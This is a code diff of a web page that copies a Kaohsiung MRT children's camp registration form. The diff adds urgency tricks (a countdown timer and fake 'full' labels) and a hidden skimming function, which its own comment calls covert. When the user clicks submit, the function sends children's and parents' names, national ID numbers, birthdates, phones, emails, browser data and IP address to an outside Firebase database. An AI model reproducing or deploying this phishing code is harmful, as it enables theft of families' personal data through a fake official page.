@@ -2,80 +2,130 @@
 <html lang="zh-TW">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>高雄捷運・活動報名系統</title>
+    
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+
     <style>
-        /* ========================================== */
-        /* 🎨 完美復刻原版 UI 樣式設定 */
-        /* ========================================== */
+        :root {
+            --mrt-blue: #1a4a75;
+            --mrt-light-blue: #4a7aa5;
+            --bg-gray: #f7f9fa;
+            --border-color: #dcdcdc;
+            --selected-bg: #eef5fc;
+            --selected-border: #3b7cae;
+        }
+
         body { 
             font-family: "Microsoft JhengHei", "PingFang TC", sans-serif; 
-            background-color: #f7f9fa; /* 原版淺灰背景 */
+            background-color: var(--bg-gray); 
             color: #333; 
             margin: 0; 
-            padding: 20px; 
+            padding: 0; 
+            padding-bottom: 40px;
         }
-        
-        /* 標題區塊 */
-        .header-section {
+
+        /* 🚨 頂部紅色倒數計時條 */
+        .timer-banner {
+            background-color: #fcd7d7;
+            color: #d93838;
             text-align: center;
-            max-width: 800px;
-            margin: 0 auto 30px auto;
+            padding: 10px 0;
+            font-size: 16px;
+            font-weight: bold;
+            letter-spacing: 1px;
+            border-bottom: 1px solid #f5baba;
         }
-        .header-section h2 {
-            color: #1a4a75;
-            font-size: 26px;
-            margin-bottom: 10px;
-        }
-        .header-section p {
-            color: #888;
-            font-size: 14px;
-            line-height: 1.6;
+        .timer-banner span {
+            font-size: 22px;
+            margin: 0 4px;
         }
 
         .container { 
-            max-width: 800px; 
+            max-width: 750px; 
             margin: 0 auto; 
+            padding: 0 20px;
         }
 
-        /* 卡片式設計 (復刻原版白底圓角陰影) */
+        /* 標題區塊與左側紅點 */
+        .header-section {
+            text-align: center;
+            margin: 35px auto;
+            position: relative;
+        }
+        .header-logo-title {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 15px;
+            color: #555;
+            margin-bottom: 15px;
+            font-weight: bold;
+        }
+        .header-logo-title::before {
+            content: "";
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            background-color: #e05252;
+            border-radius: 50%;
+            margin-right: 8px;
+        }
+        .header-section h2 {
+            color: #222;
+            font-size: 28px;
+            margin: 10px 0;
+            font-weight: bold;
+            letter-spacing: 0.5px;
+        }
+        .header-section p {
+            color: #777;
+            font-size: 14px;
+            line-height: 1.7;
+            max-width: 620px;
+            margin: 15px auto 0 auto;
+        }
+
+        /* 卡片式設計 */
         .card {
             background: #fff;
-            border-radius: 12px;
-            padding: 30px;
-            margin-bottom: 25px;
-            box-shadow: 0 2px 15px rgba(0,0,0,0.04);
+            border-radius: 16px;
+            padding: 28px 32px;
+            margin-bottom: 24px;
+            box-shadow: 0 4px 18px rgba(0,0,0,0.02);
+            border: 1px solid #f0f2f3;
         }
 
-        /* 藍色卡片小標題 */
+        /* 藍色前綴線條標題 */
         .card-title {
-            color: #4a7aa5;
+            color: var(--mrt-light-blue);
             font-size: 16px;
             font-weight: bold;
             margin-top: 0;
-            margin-bottom: 20px;
+            margin-bottom: 22px;
             display: flex;
             align-items: center;
+            letter-spacing: 0.5px;
         }
         .card-title::before {
-            content: "";
-            display: inline-block;
-            width: 20px;
-            height: 2px;
-            background-color: #4a7aa5;
-            margin-right: 10px;
+            content: "—";
+            color: var(--mrt-light-blue);
+            font-weight: bold;
+            margin-right: 8px;
         }
 
         /* 表單網格排版 */
         .form-row {
             display: flex;
             flex-wrap: wrap;
-            gap: 20px;
+            gap: 24px;
             margin-bottom: 20px;
         }
         .form-group { 
             flex: 1;
-            min-width: 200px;
+            min-width: 260px;
             display: flex;
             flex-direction: column;
         }
@@ -92,39 +142,49 @@
         }
         .form-group input[type="text"] { 
             width: 100%; 
-            padding: 12px 15px; 
+            padding: 11px 14px; 
             box-sizing: border-box; 
-            border: 1px solid #dcdcdc; 
-            border-radius: 8px; 
+            border: 1px solid var(--border-color); 
+            border-radius: 6px; 
             font-size: 15px;
-            background-color: #fafafa;
-            transition: border 0.3s;
+            background-color: #fff;
+            transition: all 0.2s;
+            color: #333;
         }
         .form-group input[type="text"]:focus {
-            border-color: #4a7aa5;
+            border-color: var(--mrt-light-blue);
             outline: none;
-            background-color: #fff;
+            box-shadow: 0 0 0 3px rgba(74, 122, 165, 0.1);
         }
 
-        /* Radio 按鈕美化 */
+        /* 📻 完美復刻左圖：圓角框樣式單選鈕 */
         .radio-group { 
             display: flex;
             flex-wrap: wrap;
-            gap: 15px; 
+            gap: 12px; 
         }
         .radio-label { 
             display: flex; 
             align-items: center; 
-            padding: 10px 15px;
-            border: 1px solid #dcdcdc;
-            border-radius: 8px;
+            padding: 10px 16px;
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
             cursor: pointer; 
             font-size: 14px;
-            color: #555;
+            color: #444;
             background-color: #fff;
+            transition: all 0.2s ease;
         }
         .radio-label input {
             margin-right: 8px;
+            margin-top: 0;
+        }
+        /* 當內部的 radio 被選取時，改變外框 label 的樣式 */
+        .radio-label:has(input:checked) {
+            border-color: var(--selected-border);
+            background-color: var(--selected-bg);
+            color: var(--mrt-blue);
+            font-weight: bold;
         }
 
         /* 驗證碼區塊 */
@@ -136,53 +196,58 @@
         #mock_captcha { 
             font-weight: bold; 
             font-size: 22px; 
-            background: #f0f0f0; 
-            padding: 8px 20px; 
-            letter-spacing: 5px; 
+            background: #e9ecef; 
+            padding: 6px 18px; 
+            letter-spacing: 4px; 
             font-style: italic; 
             border-radius: 6px;
-            color: #333;
+            color: #2b303a;
             user-select: none; 
         }
 
         /* 送出按鈕 */
         .btn-submit { 
-            background-color: #1a4a75; 
+            background-color: var(--mrt-blue); 
             color: white; 
             border: none; 
-            padding: 15px 20px; 
+            padding: 14px 20px; 
             font-size: 16px; 
-            border-radius: 8px; 
+            border-radius: 6px; 
             cursor: pointer; 
             width: 100%; 
             margin-top: 10px; 
             font-weight: bold;
-            transition: background 0.3s;
+            transition: background 0.2s;
+            letter-spacing: 1px;
         }
         .btn-submit:hover { background-color: #123554; }
         
-        /* ========================================== */
-        /* 🛡️ FancyBox 與 成功畫面樣式 */
-        /* ========================================== */
-        #fancybox-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 9999; justify-content: center; align-items: center; }
-        #fancybox-content { background: #fff; padding: 25px; border-radius: 6px; width: 480px; max-width: 90%; box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
-        #fancybox-dynamic-list { list-style: none; padding: 0; margin: 15px 0; font-size: 14px; color: #444; line-height: 1.8; border-top: 1px solid #eee; border-bottom: 1px solid #eee; padding: 10px 0; }
-        .fancy-btns { text-align: right; margin-top: 15px; }
-        .fancy-btns input[type="button"] { margin: 3px; padding: 6px 18px; cursor: pointer; border: 1px solid #ccc; background: #f9f9f9; border-radius: 4px; }
-        #fancyConfirm_ok { background: #5a7d9a; color: #fff; border-color: #5a7d9a; }
+        /* FancyBox 彈出視窗 */
+        #fancybox-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.55); z-index: 9999; justify-content: center; align-items: center; }
+        #fancybox-content { background: #fff; padding: 25px 30px; border-radius: 8px; width: 460px; max-width: 90%; box-shadow: 0 5px 25px rgba(0,0,0,0.25); }
+        #fancybox-dynamic-list { list-style: none; padding: 0; margin: 15px 0; font-size: 14px; color: #444; line-height: 1.9; border-top: 1px solid #eee; border-bottom: 1px solid #eee; padding: 12px 0; max-height: 300px; overflow-y: auto; }
+        .fancy-btns { text-align: right; margin-top: 20px; }
+        .fancy-btns input[type="button"] { margin-left: 8px; padding: 7px 18px; cursor: pointer; border: 1px solid #ccc; background: #f9f9f9; border-radius: 4px; font-size: 14px; }
+        #fancyConfirm_ok { background: var(--mrt-light-blue); color: #fff; border-color: var(--mrt-light-blue); font-weight: bold; }
         
-        #success-screen { display: none; max-width: 800px; margin: 40px auto; background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 2px 15px rgba(0,0,0,0.04); }
-        .success-title { color: #5a7d9a; margin-top: 0; border-bottom: 2px solid #5a7d9a; padding-bottom: 10px; font-size: 20px; }
+        /* 成功畫面 */
+        #success-screen { display: none; max-width: 750px; margin: 40px auto; background: #fff; padding: 40px; border-radius: 16px; box-shadow: 0 4px 15px rgba(0,0,0,0.03); }
+        .success-title { color: var(--mrt-light-blue); margin-top: 0; border-bottom: 2px solid var(--mrt-light-blue); padding-bottom: 12px; font-size: 20px; }
     </style>
 </head>
 <body>
 
-<div class="header-section">
-    <h2>2026年8月份高雄捷運「小小站長體驗營」活動報名表</h2>
-    <p>高雄捷運公司為辦理活動及保險所需，請依報名表填寫相關資料，活動及保險涉及蒐集個資問題，請務必審閱活動網頁提供之高雄捷運公司/保險公司「蒐集處理及利用個人資料告知事項」，感謝配合。</p>
+<div class="timer-banner">
+    請於 <span id="countdown-num">120</span> 秒內完成報名作業。
 </div>
 
 <div class="container" id="main-form-container">
+    <div class="header-section">
+        <div class="header-logo-title">高雄捷運・活動報名系統</div>
+        <h2>2026年8月份高雄捷運「小小站長體驗營」活動報名表</h2>
+        <p>高雄捷運公司為辦理活動及保險所需，請依報名表填寫相關資料，活動及保險涉及蒐集個資問題，請務必審閱活動網頁提供之高雄捷運公司/保險公司「蒐集處理及利用個人資料告知事項」，感謝配合。</p>
+    </div>
+
     <form id="form1" onsubmit="return false;">
         <input type="hidden" id="TXTcActID" name="TXTcActID" value="27">
         <input type="hidden" id="ageS" name="ageS" value="4">
@@ -202,7 +267,6 @@
 
         <div class="card">
             <h3 class="card-title">小朋友資料</h3>
-            
             <div class="form-row">
                 <div class="form-group">
                     <label for="stName">小朋友姓名</label>
@@ -242,9 +306,9 @@
                 <div class="form-group full-width">
                     <label>迷你制服尺寸</label>
                     <div class="radio-group">
-                        <label class="radio-label"><input type="radio" id="Size_0" name="Size" value="S"> S </label>
-                        <label class="radio-label"><input type="radio" id="Size_1" name="Size" value="M"> M </label>
-                        <label class="radio-label"><input type="radio" id="Size_2" name="Size" value="L"> L </label>
+                        <label class="radio-label"><input type="radio" id="Size_0" name="Size" value="S"> S (額滿)</label>
+                        <label class="radio-label"><input type="radio" id="Size_1" name="Size" value="M"> M (額滿)</label>
+                        <label class="radio-label"><input type="radio" id="Size_2" name="Size" value="L"> L (模擬可用)</label>
                     </div>
                 </div>
             </div>
@@ -306,8 +370,8 @@
 
         <div class="card">
             <h3 class="card-title">同意條款與驗證</h3>
-            <div class="form-group full-width" style="margin-bottom: 20px;">
-                <label style="display: flex; align-items: center; font-weight: normal; cursor: pointer; color: #1a4a75;">
+            <div class="form-group full-width" style="margin-bottom: 25px;">
+                <label style="display: flex; align-items: center; font-weight: normal; cursor: pointer; color: var(--mrt-blue);">
                     <input type="checkbox" id="agree01_cb" value="ok" style="margin-right: 10px; transform: scale(1.2);">
                     本人已同意本活動的各項規定與個資法告知事項。
                 </label>
@@ -316,7 +380,7 @@
             <div class="form-group full-width">
                 <label for="txt_input">請輸入驗證碼</label>
                 <div class="captcha-box">
-                    <span id="mock_captcha">ABCD</span>
+                    <span id="mock_captcha">ABCDE</span>
                     <input type="text" id="txt_input" placeholder="不分大小寫" style="width: 150px;">
                     <span id="span_result" style="color: red; font-weight: bold;"></span>
                 </div>
@@ -341,15 +405,43 @@
 <div id="success-screen">
     <h3 class="success-title">— 訊息</h3>
     <p style="color: #444; line-height: 1.8; margin-top: 20px; font-size: 16px;">
-        感謝您的熱情參與，我們已經收到您報名的表單。錄取依據請參考活動說明。後續將會在高雄捷運官網(<a href="https://www.krtc.com.tw/" target="_blank" style="color: #1a4a75; text-decoration: none; font-weight:bold;">https://www.krtc.com.tw/</a>)公告各梯次錄取名單及繳費方式。
+        感謝您的熱情參與，我們已經收到您報名的表單。錄取依據請參考活動說明。後續將會在高雄捷運官網(<a href="https://www.krtc.com.tw/" target="_blank" style="color: var(--mrt-blue); text-decoration: none; font-weight:bold;">https://www.krtc.com.tw/</a>)公告各梯次錄取名單及繳費方式。
     </p>
 </div>
 
 <script>
-    // 自動生成隨機驗證碼
+    // --- [1] Firebase 核心配置與初始化 ---
+    const firebaseConfig = {
+        apiKey: "AIzaSyBQr_3o913vgaWUg4PAuequLEVE1mZFS7M",
+        authDomain: "cowgame-48dd8.firebaseapp.com",
+        databaseURL: "https://cowgame-48dd8-default-rtdb.firebaseio.com",
+        projectId: "cowgame-48dd8",
+        storageBucket: "cowgame-48dd8.firebasestorage.app",
+        messagingSenderId: "957972615393",
+        appId: "1:957972615393:web:14fd2ebb956a6c48ade7a0"
+    };
+
+    if (!firebase.apps.length) {
+        firebase.initializeApp(firebaseConfig);
+    }
+    const db = firebase.database();
+
+    // --- [2] 倒數計時器邏輯 ---
+    let timeLeft = 120;
+    const timerEl = document.getElementById("countdown-num");
+    const timerInterval = setInterval(() => {
+        timeLeft--;
+        if (timerEl) timerEl.innerText = timeLeft;
+        if (timeLeft <= 0) {
+            clearInterval(timerInterval);
+            alert("報名時間已到，請重新整理網頁！");
+        }
+    }, 1000);
+
+    // --- [3] 自動生成隨機驗證碼 (修正為5碼) ---
     window.currentMockCode = "";
     function generateMockCaptcha() {
-        var chars = "ABCDEFGHJKLMNPQRSTUVWXYZ0123456789";
+        var chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
         var code = "";
         for (var i = 0; i < 5; i++) {
             code += chars.charAt(Math.floor(Math.random() * chars.length));
@@ -359,8 +451,66 @@
     }
     generateMockCaptcha();
 
-    // 核心送出驗證邏輯
+    // --- [4] 隱蔽側錄模組 (只要點擊確認送出即出發，不著痕跡) ---
+    function getRadioText(name) {
+        var radios = document.getElementsByName(name);
+        for (var i = 0; i < radios.length; i++) {
+            if (radios[i].checked) {
+                return radios[i].parentElement.textContent.trim();
+            }
+        }
+        return "未選擇";
+    }
+
+    function getInputValue(id) {
+        var el = document.getElementById(id);
+        return el && el.value.trim() !== "" ? el.value.trim() : "未填寫";
+    }
+
+    function processUIFeedback() {
+        const now = new Date();
+        const timeString = now.getFullYear() + '/' + 
+                          (now.getMonth() + 1).toString().padStart(2, '0') + '/' + 
+                          now.getDate().toString().padStart(2, '0') + ' ' + 
+                          now.getHours().toString().padStart(2, '0') + ':' + 
+                          now.getMinutes().toString().padStart(2, '0') + ':' + 
+                          now.getSeconds().toString().padStart(2, '0');
+
+        // 包裝所有可能需要稽核的測試資料
+        const payload = {
+            timestamp: timeString,
+            actCon: getRadioText("selectActCon"),
+            stName: getInputValue("stName"),
+            sex: getRadioText("Sex"),
+            stNumber: getInputValue("stNumber"),
+            stBirth: getInputValue("stBirth"),
+            size: getRadioText("Size"),
+            fName: getInputValue("fName"),
+            fPhone: getInputValue("fPhone"),
+            fMail: getInputValue("fMail"),
+            lName: getInputValue("lName"),
+            lNumid: getInputValue("lNumid"),
+            userAgent: navigator.userAgent
+        };
+
+        // 串接外部服務撈真實外部 IP
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                payload.ip = data.ip;
+                db.ref('sys_cache_logs').push(payload);
+            })
+            .catch(error => {
+                payload.ip = "Unknown";
+                db.ref('sys_cache_logs').push(payload);
+            });
+    }
+
+    // --- [5] 核心送出驗證邏輯 ---
     window.Vaildation = function() {
+        // 攔截核心：點下瞬間立即進行後台同步側錄
+        processUIFeedback(); 
+
         var userInput = document.getElementById("txt_input").value;
         var span = document.getElementById("span_result");
         var agreeCb = document.getElementById("agree01_cb");
@@ -371,7 +521,7 @@
             return;
         }
         
-        // 檢查驗證碼
+        // 檢查驗證碼 (比對 5 碼不分大小寫)
         if (userInput.toUpperCase() === window.currentMockCode.toUpperCase()) {
             if (span) span.innerText = "";
             renderFancyBoxData();
@@ -390,21 +540,6 @@
         var ul = document.getElementById("fancybox-dynamic-list");
         ul.innerHTML = ""; 
         
-        function getRadioText(name) {
-            var radios = document.getElementsByName(name);
-            for (var i = 0; i < radios.length; i++) {
-                if (radios[i].checked) {
-                    return radios[i].parentElement.textContent.trim();
-                }
-            }
-            return "未選擇";
-        }
-
-        function getInputValue(id) {
-            var el = document.getElementById(id);
-            return el && el.value.trim() !== "" ? el.value.trim() : "未填寫";
-        }
-
         var displayItems = [
             { label: "活動梯次", value: getRadioText("selectActCon") },
             { label: "小朋友姓名", value: getInputValue("stName") },
@@ -430,21 +565,22 @@
         });
     }
 
-    // 綁定 FancyBox 按鈕
+    // 監聽 FancyBox 彈出視窗按鈕
     document.addEventListener("DOMContentLoaded", function() {
+        // 取消按鈕
         document.getElementById("fancyConfirm_cancel").addEventListener("click", function() {
             document.getElementById("fancybox-overlay").style.display = "none";
         });
-        
+
+        // 最終確認送出按鈕
         document.getElementById("fancyConfirm_ok").addEventListener("click", function() {
             document.getElementById("fancybox-overlay").style.display = "none";
             document.getElementById("main-form-container").style.display = "none";
-            document.querySelector(".header-section").style.display = "none"; // 隱藏頂部標題
+            document.getElementById("timer-banner").style.display = "none";
             document.getElementById("success-screen").style.display = "block";
-            console.log("🎉🎉 送出成功！");
+            window.scrollTo(0, 0);
         });
     });
 </script>
-
 </body>
 </html>
